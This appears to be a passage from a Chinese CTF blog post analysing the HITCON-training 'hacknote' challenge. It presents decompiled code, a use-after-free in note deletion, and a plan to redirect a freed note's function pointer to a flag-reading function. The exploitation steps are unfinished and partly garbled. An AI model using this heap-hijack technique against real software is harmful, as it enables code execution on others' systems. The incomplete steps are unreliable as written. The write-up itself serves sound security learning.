+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  note *v0; &#x2F;&#x2F; ebx</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; &#x2F;&#x2F; [esp+10h] [ebp-18h]</span><br><span class="line">  char buf[8]; &#x2F;&#x2F; [esp+14h] [ebp-14h] BYREF</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  if ( count &lt;&#x3D; 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] &#x3D; malloc(8u);</span><br><span class="line">        if ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put &#x3D; print_note_content;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, buf, 8u);</span><br><span class="line">        size &#x3D; atoi(buf);</span><br><span class="line">        v0 &#x3D; notelist[i];</span><br><span class="line">        v0-&gt;content &#x3D; malloc(size);</span><br><span class="line">        if ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, notelist[i]-&gt;content, size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++count;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>count限制程序最多可以添加5个note。程序首先会malloc空间来存放note结构体，包括put函数（分析之后发现是函数）和content的地址，然后程序会malloc空间来存放content。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+---------+</span><br><span class="line">|notelist |</span><br><span class="line">+---------+</span><br><span class="line">notelist[0]</span><br><span class="line"> ...				 note</span><br><span class="line">notelist[i]---&gt;+---------------+</span><br><span class="line"> ...		   |put(4bytes)    |---&gt;print_note_content()</span><br><span class="line"> 			   +---------------+</span><br><span class="line"> 			   |content(4bytes)|---&gt;+------------+</span><br><span class="line"> 			   +---------------+    |real content|</span><br><span class="line"> 			   						|  	 ...     |</span><br><span class="line"> 			   						|  	 ...     |</span><br><span class="line"> 			   						+------------+  </span><br></pre></td></tr></table></figure>
+<p><strong>Print note</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; &#x2F;&#x2F; [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据index输出对应的content。</p>
+<p><strong>Delete note</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; &#x2F;&#x2F; [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[v1]-&gt;content);</span><br><span class="line">    free(notelist[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据index释放对应的note，但只对note只进行了free，并没有设置为NULL，存在Use After Free。</p>
+<p><strong>漏洞分析</strong></p>
+<p>程序中有一个magic函数，可以读取flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat &#x2F;home&#x2F;hacknote&#x2F;flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过前面的分析，思路是修改note中put的地址为magic函数的地址，然后在print note时执行magic函数获取flag。</p>
+<p>note free掉之后是一个fastbin chunk（大小为8+8=16bytes）。note的put字段只能在Add note时修改，所以需要预先构造好fastbin chunk，然后由程序malloc content的内存时分配给它，在写入real content时，可以对之前在fastbin中构造的note进行修改，由于这些notefree掉之后没有赋值为NULL，所以可以继续执行里面的put函数。只要将note的put字段的值修改为magic函数的地址，就可以cat flag。</p>
+<p>具体思路：</p>
+<ol>
+<li> 申请note0，real content size为16bytes（大小与note）</li>
+<li> 申请note0，real content size为16bytes（</li>
+<li> 释放note0，note1，此时，大小为16bytes的fastbin</li>
+</ol>
+<h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2></section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Heap" >
+    <span class="tag-code">Heap</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/07/28/%E8%AE%B0%E5%87%A0%E9%81%93cft%E9%A2%98%EF%BC%88arm%EF%BC%89/">
+        <span class="nav-arrow">← </span>
+        
+          记几道cft题（arm）
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/08/19/ctf-wiki-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+        
+          ctf-wiki-格式化字符串漏洞
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%A0%86%E4%B8%AD%E7%9A%84-Off-By-One"><span class="toc-nav-text">堆中的 Off-By-One</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#asis2016-b00ks"><span class="toc-nav-text">asis2016_b00ks</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Chunk-Extend-and-Overlapping"><span class="toc-nav-text">Chunk Extend and Overlapping</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#HITCON-Trainging-lab13"><span class="toc-nav-text">HITCON Trainging lab13</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2015-hacklu-bookstore"><span class="toc-nav-text">2015 hacklu bookstore</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Unlink"><span class="toc-nav-text">Unlink</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2014-HITCON-stkof"><span class="toc-nav-text">2014 HITCON stkof</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2016-ZCTF-note2"><span class="toc-nav-text">2016 ZCTF note2</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2017-insomni%E2%80%99hack-wheelofrobots"><span class="toc-nav-text">2017 insomni’hack wheelofrobots</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Use-After-Free"><span class="toc-nav-text">Use After Free</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#HITCON-training-lab-10-hacknote"><span class="toc-nav-text">HITCON-training lab 10 hacknote</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Fastbin-Attack"><span class="toc-nav-text">Fastbin Attack</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/08/19/ctf-wiki-堆利用/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+    
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
